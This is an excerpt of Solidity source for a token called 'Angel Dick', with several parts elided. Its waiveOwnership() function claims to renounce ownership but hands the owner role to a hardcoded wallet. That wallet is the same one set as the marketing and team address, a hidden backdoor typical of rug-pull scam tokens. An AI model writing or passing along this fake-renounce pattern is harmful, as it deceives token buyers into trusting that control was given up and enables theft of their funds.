...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xa50306DE9d399CBD19b0CF7145B08e7968c95C64);
    }
...
contract AngelDick is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Angel Dick";
    string private _symbol = "AD";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xa50306DE9d399CBD19b0CF7145B08e7968c95C64);
    address payable private teamWalletAddress = payable(0xa50306DE9d399CBD19b0CF7145B08e7968c95C64);
